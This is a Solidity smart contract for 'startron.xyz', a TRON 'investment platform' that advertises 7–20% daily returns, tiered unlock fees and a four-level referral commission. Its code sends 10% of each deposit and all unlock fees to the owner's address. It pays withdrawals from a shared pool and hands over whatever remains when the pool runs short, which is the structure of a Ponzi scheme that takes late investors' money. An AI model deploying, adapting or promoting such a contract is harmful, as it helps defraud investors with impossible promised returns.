//SourceUnit: startron.sol

/*
 * 
 *   startron.xyz - Tron investment platform based on the TRX blockchain smart-contract technology.
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐  
 *   │   Official Website: https://startron.xyz/                             │
 *   └───────────────────────────────────────────────────────────────────────┘ 
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect TRON browser extension TronLink or TronMask, or mobile wallet apps like TronWallet or Banko.
 *   2) Send any TRX amount (200 TRX minimum) using our website invest button.
 *   3) Wait for your earnings.
 *   4) Withdraw earnings any time using our website "Withdraw" button.
 *
 *   [INVESTMENT CONDITIONS]
 * 
 *   - [BASIC PLAN]
 *      - Membership fee  : FREE
 *      - Minimum deposit : 200 TRX
 *      - Maximum income  : 210% in 30 Days,  7% Daily ROI
 * 
 *   - [SILVER PLAN]
 *      - Unlock fee      : 500 TRX
 *      - Minimum deposit : 500 TRX
 *      - Maximum income  : 250% in 25 Days, 10% Daily ROI
 * 
 *   - [GOLD PLAN]
 *      - Unlock fee      : 1000 TRX
 *      - Minimum deposit : 1000 TRX
 *      - Maximum income  : 300% in 25 Days, 12% Daily ROI
 * 
 *   - [PLATINUM PLAN]
 *      - Unlock fee      : 2000 TRX
 *      - Minimum deposit : 2000 TRX
 *      - Maximum income  : 400% in 20 Days, 20% Daily ROI
 * 
 *   [REFERRAL PROGRAM]
 *
 *   Share your referral link with your partners and get additional bonuses!
 *   - 4-level referral commission: 7.5% - 4% - 2.5% - 1%
 *
 *   ────────────────────────────────────────────────────────────────────────
 */
 
 

pragma solidity 0.5.9;


contract STARTRON {

    struct Player {
        address upline;
        uint256 dividends;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        Deposit[] deposits;
        mapping(uint8 => uint256) structure;
        mapping(uint8 => uint256) unlocked;
    } 

    struct Deposit {
        uint8 tarif;
        uint256 amount;
        uint256 time;
    }

    struct Tarif {
        uint16 life_days;
        uint16 percent;
		uint256 value;
    }

    address payable public _self;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public direct_bonus;
    uint256 public match_bonus;
	
	uint public launch_date;
    
    uint8[] public ref_bonuses;

    Tarif[] public tarifs;
    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

	modifier restricted() {
		require(now >= launch_date || msg.sender == _self);
		_;
	}
	
    constructor() public {
	
        _self = msg.sender;

        tarifs.push(Tarif(30, 210, 2e8));
        tarifs.push(Tarif(25, 250, 5e8));
        tarifs.push(Tarif(25, 300, 1e9));
        tarifs.push(Tarif(20, 400, 2e9));
        
        ref_bonuses.push(75);
        ref_bonuses.push(40);
        ref_bonuses.push(25);
        ref_bonuses.push(10);
		
		launch_date = 1605859200;
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = now;
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / 1000;
			if(now < launch_date) {
				bonus = _amount * (ref_bonuses[i] + 50) / 1000;
			}
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
		
        if(players[_addr].upline == address(0)) {
			for(uint8 i = 0; i < tarifs.length; i++) {
				players[_addr].unlocked[i] = 0;
			}
		}
		
        if(players[_addr].upline == address(0) && _addr != _self) {
			
            if(players[_upline].deposits.length == 0) {
                _upline = _self;
            }
            else {
                players[_addr].direct_bonus += _amount / 100;
                direct_bonus += _amount / 100;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Invalid Tier");
		require(tarifs[_tarif].value <= msg.value, "Invalid Tier Value");

        Player storage player = players[msg.sender];
		if(_tarif != 0) {
			require(player.unlocked[_tarif] == 1, "Tier Locked");
		}

        require(player.deposits.length <= 200, "Max 200 deposits.");

        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: (now > launch_date) ? now : launch_date
        }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);

        _self.transfer(msg.value / 10);
        
        emit NewDeposit(msg.sender, msg.value, _tarif);
    }
    
    function unlock(uint8 _tarif, address _upline) external payable {
		require(tarifs[_tarif].value == msg.value, "Invalid Value");

        Player storage player = players[msg.sender];

        _setUpline(msg.sender, _upline, msg.value);

		for(uint8 i = 0; i <= _tarif; i++) {
			player.unlocked[i] = 1;
		}

        _self.transfer(msg.value);
    }
    
    function withdraw() external restricted {
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.direct_bonus + player.match_bonus;

        player.dividends = 0;
        player.direct_bonus = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

		if(amount >= address(this).balance) {
			msg.sender.transfer(address(this).balance);
		} else {
			msg.sender.transfer(amount);
		}
        
        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = now < time_end ? now : time_end;

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return value;
    }

    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[4] memory structure, uint[4][100] memory deposits, uint256[4] memory unlocked) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }
		
		for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = now < time_end ? now : time_end;

            if(from < to) {
				deposits[i][2] = time_end - now;
                deposits[i][3] = dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            } else {
				deposits[i][2] = 0;
				deposits[i][3] = 0;
			}
			
			deposits[i][0] = dep.tarif;
			deposits[i][1] = dep.amount;
        }
		for(uint8 i = 0; i < tarifs.length; i++) {
			unlocked[i] = player.unlocked[i];
		}

        return (
            payout + player.dividends + player.direct_bonus + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure,
			deposits,
			unlocked
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _direct_bonus, uint256 _match_bonus, uint _launch_date) {
        return (invested, withdrawn, direct_bonus, match_bonus, launch_date);
    }
}